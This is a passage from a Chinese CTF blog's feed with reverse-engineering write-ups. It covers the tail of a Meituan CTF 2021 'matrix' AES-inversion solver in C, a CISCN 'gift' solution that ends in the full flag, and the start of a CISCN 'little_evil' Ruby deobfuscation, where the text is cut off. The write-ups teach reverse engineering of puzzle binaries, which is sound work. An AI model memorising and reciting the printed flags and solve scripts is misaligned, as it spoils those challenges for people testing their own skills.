class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">0</span>] = colOne[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">1</span>] = colTwo[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">2</span>] = colThree[j];<br>        <span class="hljs-built_in">array</span>[j][<span class="hljs-number">3</span>] = colFour[j];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参数 c: 密文的字符串数组。</span><br><span class="hljs-comment"> * 参数 clen: 密文的长度。</span><br><span class="hljs-comment"> * 参数 key: 密钥的字符串数组。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">deAes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *c, <span class="hljs-keyword">int</span> clen, <span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> cArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> keylen,k;<br>    keylen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">if</span>(clen == <span class="hljs-number">0</span> || clen % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密文字符长度必须为16的倍数！现在的长度为%d\n&quot;</span>,clen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!checkKeyLen(keylen)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密钥字符长度错误！长度必须为16、24和32。当前长度为%d\n&quot;</span>,keylen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    extendKey(key);<span class="hljs-comment">//扩展密钥</span><br><br>    <span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k &lt; clen; k += <span class="hljs-number">16</span>) &#123;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">int</span> wArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br>        convertToIntArray(c + k, cArray);<br><br><br><br><br><br>        addRoundKey(cArray, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            deSubBytes(cArray);<br><br>            deShiftRows(cArray);<br><br>            deMixColumns(cArray);<br>            getArrayFrom4W(i, wArray);<br>            deMixColumns(wArray);<br><br>            addRoundTowArray(cArray, wArray);<br>        &#125;<br><br>        deSubBytes(cArray);<br><br>        deShiftRows(cArray);<br><br>        addRoundKey(cArray, <span class="hljs-number">0</span>);<br><br>        convertArrayToStr(cArray, c + k);<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">rol</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROL1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROL1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROL1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROL1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ror</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] )</span></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        a[i][<span class="hljs-number">0</span>] = __ROR1__(a[i][<span class="hljs-number">0</span>], i);<br>        a[i][<span class="hljs-number">1</span>] = __ROR1__(a[i][<span class="hljs-number">1</span>], i);<br>        a[i][<span class="hljs-number">2</span>] = __ROR1__(a[i][<span class="hljs-number">2</span>], i);<br>        a[i][<span class="hljs-number">3</span>] = __ROR1__(a[i][<span class="hljs-number">3</span>], i);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> xor2[<span class="hljs-number">16</span>] = &#123;<br>            <span class="hljs-number">0x61</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x78</span><br>    &#125;;<br>    <span class="hljs-keyword">int</span> target[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<br>            <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xEF</span><br>    &#125;;<br><br><span class="hljs-comment">//    1. 字节内移位</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    2. 轮密钥加密</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    3. shift</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    4. aes S盒加密置换</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    5. 矩阵乘法</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    6. shift</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    7. xor密钥运算</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    8. 列混合</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    9. shift</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ori:\n&quot;</span>);<br>    printArray(target);<br><br>    deShiftRows(target);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;9. shift_in:\n&quot;</span>);<br>    printArray(target);<br><br><br>    deMixColumns(target);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;8. 列混合 in:\n&quot;</span>);<br>    printArray(target);<br><br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>         <span class="hljs-comment">//   printf(&quot;%x %x\n&quot;,xor2[i * 4 + j],  target[i * 4][j]);</span><br>            target[i][j] ^= xor2[i * <span class="hljs-number">4</span> + j];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 7. xor密钥运算 in:\n&quot;</span>);<br>    printArray(target);<br><br>    deShiftRows(target);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 6. shift in:\n&quot;</span>);<br>    printArray(target);<br><br><br><br>    <span class="hljs-comment">// 矩阵逆</span><br>    <span class="hljs-keyword">int</span> target2[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xb5</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xc5</span>,<br>                         <span class="hljs-number">0x74</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x4b</span>,<br>                         <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x2</span>,<br>                         <span class="hljs-number">0x19</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xf6</span>&#125;;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5. 矩阵乘法 in:\n&quot;</span>);<br>    printArray(target2);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            target2[i][j] = S3[target2[i][j]];<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4. aes S盒加密置换 in:\n&quot;</span>);<br>    printArray(target2);<br><br>    deShiftRows(target2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 3. shift in:\n&quot;</span>);<br>    printArray(target2);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            target2[i][j] ^= <span class="hljs-number">0x6e</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2. 轮密钥加密 in:\n&quot;</span>);<br>    printArray(target2);<br><br><br>    ror(target2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1.in:\n&quot;</span>);<br>    printArray(target2);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;美团-CTF-2021-matrix&quot;&gt;&lt;a href=&quot;#美团-CTF-2021-matrix&quot; class=&quot;headerlink&quot; title=&quot;美团 CTF 2021 matrix&quot;&gt;&lt;/a&gt;美团 CTF 2021 matrix&lt;/h1&gt;&lt;p&gt;题目下载: </summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="AES" scheme="https://panda0s.top/tags/AES/"/>
    
  </entry>
  
  <entry>
    <title>CISCN gift</title>
    <link href="https://panda0s.top/2021/05/16/CISCN-gift/"/>
    <id>https://panda0s.top/2021/05/16/CISCN-gift/</id>
    <published>2021-05-16T07:41:17.000Z</published>
    <updated>2021-06-26T09:27:52.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-gift"><a href="#CISCN-gift" class="headerlink" title="CISCN gift"></a>CISCN gift</h1><p>题目下载: <a href="/2021/05/16/CISCN-gift/CISCN_gift.exe" title="CISCN_gift.exe">CISCN_gift.exe</a></p><p>golang 写的程序，要优化一个内置算法</p><p>程序逻辑如下（不是解题脚本）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">tab1 = [<span class="hljs-number">0x0000000000000001</span>, <span class="hljs-number">0x0000000000000003</span>, <span class="hljs-number">0x0000000000000006</span>, <span class="hljs-number">0x0000000000000009</span>, <span class="hljs-number">0x000000000000000A</span>, <span class="hljs-number">0x000000000000000B</span>, <span class="hljs-number">0x000000000000000C</span>, <span class="hljs-number">0x000000000000000D</span>, <span class="hljs-number">0x000000000000000E</span>, <span class="hljs-number">0x000000000000000F</span>, <span class="hljs-number">0x0000000000000010</span>, <span class="hljs-number">0x0000000000000011</span>, <span class="hljs-number">0x0000000000000012</span>, <span class="hljs-number">0x0000000000000014</span>, <span class="hljs-number">0x0000000000000019</span>, <span class="hljs-number">0x000000000000001E</span>, <span class="hljs-number">0x0000000000000028</span>, <span class="hljs-number">0x0000000000000042</span>, <span class="hljs-number">0x0000000000000066</span>, <span class="hljs-number">0x00000000000000A0</span>, <span class="hljs-number">0x0000000000000936</span>, <span class="hljs-number">0x0000000000003D21</span>, <span class="hljs-number">0x00000000000149A7</span>, <span class="hljs-number">0x00000000000243AC</span>, <span class="hljs-number">0x00000000000CB5BE</span>, <span class="hljs-number">0x000000000047DC61</span>, <span class="hljs-number">0x00000000016C0F46</span>, <span class="hljs-number">0x000000000262C432</span>, <span class="hljs-number">0x0000000004ACE299</span>, <span class="hljs-number">0x0000000010FBC92A</span>, <span class="hljs-number">0x00000000329ECDFD</span>, <span class="hljs-number">0x00000000370D7470</span>]<br>idx = <span class="hljs-number">0</span><br>idddd = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_goooo</span>(<span class="hljs-params">data</span>):</span><br>    v4 = [<span class="hljs-number">0</span>] * <span class="hljs-number">5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        v3 = data[i]<br>        v4[v3] ^= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> v4[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> v4[<span class="hljs-number">3</span>] == <span class="hljs-number">0</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_wtf</span>(<span class="hljs-params">pos, index, data, size1, size2</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> idddd<br>    data[pos] = index<br>    print(data)<br>    <span class="hljs-keyword">if</span> pos == size1 - <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> main_goooo(data):<br>            idddd = idddd + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>            main_wtf(pos + <span class="hljs-number">1</span>, i, data, size1, size2)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">TestN</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">global</span> idddd<br>    idddd = <span class="hljs-number">0</span><br>    aa = [<span class="hljs-number">0</span>] * n<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>        main_wtf(<span class="hljs-number">0</span>, i, aa, n, n)<br>    <span class="hljs-keyword">return</span> idddd<br><br>flag_i = [TestN(i) % <span class="hljs-number">17</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tab1]<br></code></pre></td></tr></table></figure><p>这个算法很慢，基本不可能跑出来。</p><p>TestN(1), TestN(2), TestN(3) … 跑一些比较小的额数据观察一下，很容易发现规律，用规律求解 flag 序列</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">flag_i = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tab1)):<br>    t = tab1[i]<br>    s1 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,t-<span class="hljs-number">1</span>,<span class="hljs-number">17</span>)<br>    s2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,t-<span class="hljs-number">1</span>,<span class="hljs-number">17</span>)+<span class="hljs-number">1</span><br>    tmp = (s1*s2)%<span class="hljs-number">17</span><br>    out.append(tmp)<br>print(flag_i)<br><br>=&gt; [2, 3, 2, 2, 6, 3, 4, 0, 2, 12, 5, 2, 6, 4, 2, 2, 5, 6, 2, 5, 2, 2, 12, 4, 2, 2, 2, 6, 2, 6, 0, 5]<br></code></pre></td></tr></table></figure><p>得到序列后直接映射到 flag 字符即可</p><p>CISCN{4b445b3247c45344c54c44734445452c}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CISCN-gift&quot;&gt;&lt;a href=&quot;#CISCN-gift&quot; class=&quot;headerlink&quot; title=&quot;CISCN gift&quot;&gt;&lt;/a&gt;CISCN gift&lt;/h1&gt;&lt;p&gt;题目下载: &lt;a href=&quot;/2021/05/16/CISCN-gift/</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="golang" scheme="https://panda0s.top/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>CISCN Little_evil</title>
    <link href="https://panda0s.top/2021/05/16/CISCN-Little-evil/"/>
    <id>https://panda0s.top/2021/05/16/CISCN-Little-evil/</id>
    <published>2021-05-16T06:41:44.000Z</published>
    <updated>2021-05-16T13:58:03.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-little-evil"><a href="#CISCN-little-evil" class="headerlink" title="CISCN little_evil"></a>CISCN little_evil</h1><p>比赛的时候差一点点出，非常可惜</p><p>第一次做 ruby 的逆向题，学到很多东西。这道题总体来说，要进行两种不同策略的反混淆，最后还有一层是类似于 brainfuck 的 vm，需要写 <code>decompiler</code></p><p>题目: <a href="/2021/05/16/CISCN-Little-evil/little_evil" title="littile_evil">littile_evil</a></p><h2 id="提取-out-rb"><a href="#提取-out-rb" class="headerlink" title="提取 out.rb"></a>提取 out.rb</h2><p>题目的 elf 文件是典型的 ruby 解释器。问题是源码在哪里？ 最开始，我以为是内存加载，分析源码过程中发现是用 Ruby packer 打包的 ruby 程序。Ruby packer 会把源程序相关的打包成 squashfs 文件系统并塞进 ruby 解释器。ruby packer 用了一个内存虚拟文件系统 <code>__enclose_io_memfs__</code></p><p>squashfs 用 binwalk 就可以直接提取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">binwalk -Me little_evil<br></code></pre></td></tr></table></figure><p>提取出主程序（节选）</p><p><strong>enclose_io_memfs</strong>/local/out.rb</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$l1Il</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$l1lI</span>=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llIl</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span> = <span class="hljs-variable">$lI1lll</span><span class="hljs-params">|7;<span class="hljs-keyword">end</span>;def l1lll()$lI1lll=10;<span class="hljs-keyword">end</span>;def llI1l()$lI1lll=$lI1lll|</span><span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIlI</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>+<span class="hljs-number">3</span>;<br><span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l111</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>%<span class="hljs-number">3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1IlI</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|3;<span class="hljs-keyword">end</span>;def ll1l1()$lI1lll=$lI1lll*8;<span class="hljs-keyword">end</span>;def l1lI()$lI1lll=$lI1lll-3;<span class="hljs-keyword">end</span>;def lI1lII()$lI1lll=$lI1lll%1;<span class="hljs-keyword">end</span>;def lIlIl()$lI1lll=$lI1lll&amp;10;<span class="hljs-keyword">end</span>;def lIll()$lI1lll=$lI1lll-4;<span class="hljs-keyword">end</span>;def lII1()$lI1lll=$lI1lll%2;<span class="hljs-keyword">end</span>;def l1III()$lI1lll=$lI1lll|</span><span class="hljs-number">1</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1l111</span><span class="hljs-params">()</span></span><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span><span class="hljs-params">|5;<span class="hljs-keyword">end</span>;def l1IIII()$lI1lll=$lI1lll%10;<span class="hljs-keyword">end</span>;def l11I()$l1Il=$l1Il+$lI1lll.chr;<span class="hljs-keyword">end</span>;def lIlll()$lI1lll=$lI1lll*9;<span class="hljs-keyword">end</span>;def l11IlI()$lI1lll=$lI1lll-8;<span class="hljs-keyword">end</span>;def lI1I1()$lI1lll=$lI1lll+5;<span class="hljs-keyword">end</span>;def ll11lI()$lI1lll=$lI1lll&amp;9;<span class="hljs-keyword">end</span>;def lII1l1()send($l1Il[0,4], $l1Il[4,$l1Il.length]);<span class="hljs-keyword">end</span>;l1lll;lIlI;ll1l1;l1lI;l11I;l1lll;llI1l;lIlll;l11IlI;l11I;l1lll;lIlll;llI1l;lIlI;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;l1lI;ll1l1;l1l111;l11I;l1lll;llI1l;lI1I1;lI1I1;llIl;lIlI;l11I;l1lll;llI1l;lI1I1;lI1I1;llIl;lIlI;l11I;l1lll;l1lI;ll1l1;lIlI;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;ll1l1;l1lI;lIll;l11I;l1lll;ll1l1;l1lI;lIll;l11I;l1lll;l1lI;ll1l1;l1l111;l11I;l1lll;llI1l;lI1I1;</span><br><span class="hljs-params">......[节选]</span><br></code></pre></td></tr></table></figure><h2 id="第一层-ruby-程序"><a href="#第一层-ruby-程序" class="headerlink" title="第一层 ruby 程序"></a>第一层 ruby 程序</h2><p>提取出来的 rb 程序高度混淆，难以阅读，尝试过各种在线美化工具，均无效果，于是尝试手搓反混淆。</p><p>思路:</p><ul><li>分号 ; 替换成 ;\n</li><li>解析函数名，替换所有函数名为 funcX，x是序号</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out.rb&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br>data = data.replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;;\n&quot;</span>)<br>data = data.replace(<span class="hljs-string">&quot;()&quot;</span>, <span class="hljs-string">&quot;()\n\t&quot;</span>)<br>data = data.replace(<span class="hljs-string">&quot;end;&quot;</span>, <span class="hljs-string">&quot;end;\n&quot;</span>)<br><br><br>names = &#123;&#125;<br>iidx = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data.splitlines():<br>    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;def&quot;</span>):<br>        idx = line.find(<span class="hljs-string">&quot;(&quot;</span>)<br>        funcName = line[<span class="hljs-number">4</span>:idx]<br>        names[funcName] = <span class="hljs-string">&quot;func&quot;</span> + <span class="hljs-built_in">str</span>(iidx)<br>        iidx += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> names:<br>    data = data.replace(k + <span class="hljs-string">&quot;()&quot;</span>, names[k] + <span class="hljs-string">&quot;()&quot;</span>, -<span class="hljs-number">1</span>)<br>    data = data.replace(k + <span class="hljs-string">&quot;;&quot;</span>, names[k] + <span class="hljs-string">&quot;;&quot;</span>, -<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out2.rb&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(data)<br></code></pre></td></tr></table></figure><p>简单处理后效果</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$l1Il</span>=<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$l1lI</span>=<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span> = <span class="hljs-variable">$lI1lll</span><span class="hljs-params">|7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func2()</span><br><span class="hljs-params">$lI1lll=10;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func3()</span><br><span class="hljs-params">$lI1lll=$lI1lll|</span><span class="hljs-number">4</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func4</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>+<span class="hljs-number">3</span>;<br><br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func5</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$lI1lll</span>=<span class="hljs-variable">$lI1lll</span>%<span class="hljs-number">3</span>;<br><span 